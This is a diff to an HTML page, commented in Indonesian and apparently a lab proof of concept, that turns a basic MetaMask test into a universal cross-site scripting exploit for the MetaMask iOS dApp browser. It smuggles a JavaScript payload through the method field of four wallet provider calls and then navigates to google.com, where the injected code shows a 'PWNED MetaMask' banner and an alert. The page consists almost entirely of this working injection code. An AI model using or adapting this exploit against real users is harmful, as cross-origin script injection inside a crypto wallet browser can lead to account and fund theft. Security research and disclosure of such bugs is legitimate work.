@@ -1,23 +1,117 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>MetaMask iOS RPC Test</title>
+</head>
 <body>
-<button onclick="test()">Test sendAsync Only</button>
-<pre id="result">...</pre>
-<script>
-function test() {
-  const r = document.getElementById('result');
-  try {
-    window.ethereum.sendAsync(
-      { method: 'eth_accounts', params: [], 
-        id: 1, jsonrpc: '2.0' },
-      (err, result) => {
-        r.textContent = JSON.stringify(result);
+  <a id="run" href="https://google.com/">RUN</a>
+  <pre id="status">PoC lab</pre>
+
+  <script>
+    'use strict';
+
+    const runLink = document.querySelector('#run');
+    const status = document.querySelector('#status');
+    const target = 'https://google.com/';
+
+    const impactStatements = [
+      '(async () => {',
+      String.raw`if (!/(^|\.)google\.com$/.test(location.hostname)) return;`,
+      'if (window.__mmUxssLab) return;',
+      'const provider = window.ethereum;',
+      "if (!provider || typeof provider.request !== 'function') return;",
+      'window.__mmUxssLab = true;',
+      "document.body?.insertAdjacentHTML('afterbegin', '<h1 id=mm-uxss-lab>PWNED MetaMask</h1>');",
+      "alert(document.domain);",
+      '})();'
+    ];
+
+    runLink.addEventListener('click', async event => {
+      event.preventDefault();
+
+      // Cek apakah ada MetaMask
+      if (!window.ethereum || !window.ethereum.isMetaMask) {
+        status.textContent = 'Buka di MetaMask iOS DApp browser!';
+        return;
       }
-    );
-  } catch(e) {
-    r.textContent = 'Error: ' + e.message;
-  }
-}
-</script>
+
+      let sent = 0;
+
+      // Teknik 1 - via _rpcRequest injection
+      try {
+        const payload = impactStatements.join(' ');
+        
+        window.ethereum._rpcRequest(
+          {
+            method: `zz_");${payload}//`,
+            params: [],
+            jsonrpc: '2.0',
+            id: Date.now()
+          },
+          (err, result) => {
+            status.textContent += `\n_rpcRequest: ${JSON.stringify(result)}`;
+          }
+        );
+        sent++;
+      } catch(e) {
+        status.textContent += '\n_rpcRequest failed: ' + e.message;
+      }
+
+      // Teknik 2 - via requestBatch injection
+      try {
+        const payload = impactStatements.join(' ');
+        
+        await window.ethereum._metamask.requestBatch([
+          {
+            method: `zz_");${payload}//`,
+            params: [],
+            jsonrpc: '2.0'
+          }
+        ]);
+        sent++;
+      } catch(e) {
+        status.textContent += '\nrequestBatch failed: ' + e.message;
+      }
+
+      // Teknik 3 - via sendAsync injection
+      try {
+        const payload = impactStatements.join(' ');
+
+        window.ethereum.sendAsync(
+          {
+            method: `zz_");${payload}//`,
+            params: [],
+            jsonrpc: '2.0',
+            id: Date.now()
+          },
+          (err, result) => {
+            status.textContent += `\nsendAsync: ${JSON.stringify(result)}`;
+          }
+        );
+        sent++;
+      } catch(e) {
+        status.textContent += '\nsendAsync failed: ' + e.message;
+      }
+
+      // Teknik 4 - via send injection
+      try {
+        const payload = impactStatements.join(' ');
+
+        window.ethereum.send(
+          `zz_");${payload}//`,
+          []
+        );
+        sent++;
+      } catch(e) {
+        status.textContent += '\nsend failed: ' + e.message;
+      }
+
+      status.textContent = `\n${sent} request dikirim; navigasi ke ${target}`;
+
+      // Navigate ke google.com setelah 120ms
+      setTimeout(() => location.assign(target), 120);
+    });
+  </script>
 </body>
 </html>
